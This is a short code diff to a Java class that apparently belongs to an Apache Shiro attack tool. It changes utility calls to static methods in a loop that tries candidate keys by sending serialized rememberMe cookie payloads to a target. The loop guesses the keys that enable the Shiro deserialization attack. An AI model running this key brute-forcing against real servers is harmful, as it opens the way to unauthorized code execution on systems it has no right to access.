@@ -23,11 +23,10 @@ public class KeyScanner implements ShiroScanner {
         boolean falseKey = true;
         while (scanner.hasNextLine() && falseKey) {
             ShiroHttpConnection connection = new ShiroHttpConnection(target.getBase());
-            Util util = new Util();
             ScanKey scanKey = new ScanKey();
             key = scanner.nextLine();
-            byte[] serialize = util.serialize(scanKey.getObjectPayload(null));
-            String rememberMe = util.getRememberMe(serialize, key);
+            byte[] serialize = Util.serialize(scanKey.getObjectPayload(null));
+            String rememberMe = Util.getRememberMe(serialize, key);
             System.out.println("[+] Test key: " + key);
             falseKey = connection.checkFalseKey(rememberMe);
         }
